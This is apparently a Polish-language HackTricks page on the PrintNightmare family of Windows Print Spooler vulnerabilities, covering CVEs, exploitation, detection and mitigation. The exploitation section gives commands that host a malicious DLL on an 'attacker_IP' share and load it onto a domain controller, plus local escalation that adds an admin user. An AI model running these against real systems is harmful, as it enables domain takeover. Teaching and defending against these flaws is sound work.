# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare to zbiorcza nazwa nadana rodzinie luk w usłudze **Print Spooler** systemu Windows, które umożliwiają **wykonywanie dowolnego kodu jako SYSTEM** i, gdy spooler jest dostępny przez RPC, **zdalne wykonywanie kodu (RCE) na kontrolerach domeny i serwerach plików**. Najczęściej wykorzystywane CVE to **CVE-2021-1675** (początkowo klasyfikowane jako LPE) oraz **CVE-2021-34527** (pełne RCE). Kolejne problemy, takie jak **CVE-2021-34481 (“Point & Print”)** i **CVE-2022-21999 (“SpoolFool”)**, dowodzą, że powierzchnia ataku jest wciąż daleka od zamknięcia.

---

## 1. Wrażliwe komponenty i CVE

| Rok | CVE | Krótka nazwa | Primitiv | Uwagi |
|------|-----|--------------|----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Załatane w czerwcu 2021 w CU, ale obejście przez CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx pozwala uwierzytelnionym użytkownikom na załadowanie DLL sterownika z zdalnego udziału|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalacja niesigned sterownika przez użytkowników niebędących administratorami|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Tworzenie dowolnych katalogów → sadzenie DLL – działa po poprawkach z 2021 roku|

Wszystkie one wykorzystują jedną z metod RPC **MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) lub relacje zaufania w ramach **Point & Print**.

## 2. Techniki eksploatacji

### 2.1 Kompromitacja zdalnego kontrolera domeny (CVE-2021-34527)

Uwierzytelniony, ale **nieuprzywilejowany** użytkownik domeny może uruchomić dowolne DLL jako **NT AUTHORITY\SYSTEM** na zdalnym spoolerze (często DC) poprzez:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popularne PoC to **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) oraz moduły Benjamina Delpy’ego `misc::printnightmare / lsa::addsid` w **mimikatz**.

### 2.2 Eskalacja uprawnień lokalnych (wszystkie wspierane wersje Windows, 2021-2024)

Ta sama API może być wywoływana **lokalnie** w celu załadowania sterownika z `C:\Windows\System32\spool\drivers\x64\3\` i uzyskania uprawnień SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – omijanie poprawek z 2021 roku

Poprawki Microsoftu z 2021 roku zablokowały zdalne ładowanie sterowników, ale **nie wzmocniły uprawnień do katalogów**. SpoolFool wykorzystuje parametr `SpoolDirectory`, aby utworzyć dowolny katalog w `C:\Windows\System32\spool\drivers\`, umieszcza w nim DLL z ładunkiem i zmusza spooler do jego załadowania:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Eksploit działa na w pełni zaktualizowanych systemach Windows 7 → Windows 11 oraz Server 2012R2 → 2022 przed aktualizacjami z lutego 2022

---

## 3. Wykrywanie i polowanie

* **Dzienniki zdarzeń** – włącz kanały *Microsoft-Windows-PrintService/Operational* i *Admin* i obserwuj **ID zdarzenia 808** „Usługa buforowania wydruku nie mogła załadować modułu wtyczki” lub wiadomości **RpcAddPrinterDriverEx**.
* **Sysmon** – `ID zdarzenia 7` (Obraz załadowany) lub `11/23` (Zapis/Usunięcie pliku) w `C:\Windows\System32\spool\drivers\*`, gdy proces nadrzędny to **spoolsv.exe**.
* **Linia procesów** – alerty, gdy **spoolsv.exe** uruchamia `cmd.exe`, `rundll32.exe`, PowerShell lub jakikolwiek niesigned binary.

## 4. Łagodzenie i wzmacnianie

1. **Zaktualizuj!** – Zastosuj najnowszą aktualizację zbiorczą na każdym hoście Windows, który ma zainstalowaną usługę buforowania wydruku.
2. **Wyłącz bufor, gdzie nie jest wymagany**, szczególnie na kontrolerach domeny:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Zablokuj połączenia zdalne**, jednocześnie umożliwiając lokalne drukowanie – Zasady grupy: `Konfiguracja komputera → Szablony administracyjne → Drukarki → Zezwól usłudze buforowania wydruku na akceptowanie połączeń klientów = Wyłączone`.
4. **Ogranicz Point & Print**, aby tylko administratorzy mogli dodawać sterowniki, ustawiając wartość rejestru:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Szczegółowe wskazówki w Microsoft KB5005652

---

## 5. Powiązane badania / narzędzia

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) moduły
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* Eksploit SpoolFool i opis
* Mikropaty 0patch dla SpoolFool i innych błędów buforowania

---

**Więcej do przeczytania (zewnętrzne):** Sprawdź wpis na blogu z 2024 roku – [Zrozumienie podatności PrintNightmare](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Odniesienia

* Microsoft – *KB5005652: Zarządzaj nowym domyślnym zachowaniem instalacji sterowników Point & Print*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
